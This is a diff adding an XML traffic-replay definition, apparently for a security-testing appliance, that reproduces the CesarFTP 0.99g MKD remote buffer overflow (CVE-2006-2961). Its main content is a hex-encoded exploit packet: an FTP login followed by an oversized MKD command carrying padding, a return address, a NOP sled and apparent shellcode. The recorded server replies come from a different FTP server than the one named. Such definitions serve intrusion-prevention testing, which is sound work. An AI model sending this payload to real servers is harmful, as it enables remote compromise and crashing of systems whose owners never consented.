@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<Flow closetype="client_fin" layer="tcp" name="cesarftp_bof" type="attack">
+    <MetaData application="base_threats" attackIntent="Buffer_Overflow Crashing Unauthorized_Access Unauthorized_Use" bugtraqId="" createDate="10/18/2011" cveId="CVE-2006-2961" description="CesarFTP 0.99g (MKD) Remote Buffer Overflow Exploit" details="This threat sends a crafted FTP MKD command with an excessive length causing a stack overflow. CesarFTP is an FTP daemon which typically listens on port 21." equipmentType="Application" osvdbId="" protocol="FTP" severity="" vendorsAffected="CesarFTP"/>
+    <Packets>
+        <Packet name="packet_0" pktDelay="0" tx="client">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>7573657220706861720D0A</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+        <Packet name="packet_1" pktDelay="0" tx="client">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>7061737320787878787878780D0A</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+        <Packet name="packet_2" pktDelay="0" tx="client">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>4D4B44200A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A4141416582A57C9090909090909090909090909090909090909090909090909090909090909090909090909090909031C983E9DBD9EED97424F45B817313D82272E483EBFCE2F424CA34E4D822F9A1E4A90EE1A0239D6F973AF9BBF8239907F66BF9D053239CD518BBDE6018567525122F732633D649B0FC260707537D56E53344F9E893A92DF8D9C9F9F85323996D84067627E9E2166F9812F724A02DF9A4D4A902F875A91AEC312972E4D8A932D0DD5E72E4D8A91AD8871384848EC97F8C28A876BBB0BA8C6ED6758D0330CC8D1B27411388BB0C179CBD2272E40D0A</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+        <Packet name="packet_3" pktDelay="0" tx="server">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>3232302053706972656e744654504420536572766572202857656c636f6d6520746f20626c617374657229205b3a3a666666663a35392e33312e3133312e34345d0d0a</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+        <Packet name="packet_4" pktDelay="0" tx="server">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>3333312050617373776f72642072657175697265640d0a</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>
+        <Packet name="packet_5" pktDelay="0" tx="server">
+            <frame>
+                <config>
+                    <pdus>
+                        <pdu name="Payload" pdu="custom:Custom">
+                            <pattern>3233302055736572206c6f6767656420696e2e0d0a</pattern>
+                        </pdu>
+                    </pdus>
+                </config>
+            </frame>
+        </Packet>		
+    </Packets>
+</Flow>
